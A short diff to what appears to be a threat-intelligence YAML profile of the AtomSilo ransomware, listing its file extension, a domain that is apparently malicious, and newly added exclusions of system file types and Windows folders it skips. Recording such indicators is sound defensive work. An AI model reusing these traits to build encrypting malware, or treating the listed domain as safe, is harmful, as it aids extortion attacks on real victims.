@@ -1,4 +1,11 @@
 file_extension: .atomsilo
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 domain:
   - update.ajaxrenew.com
 filename:
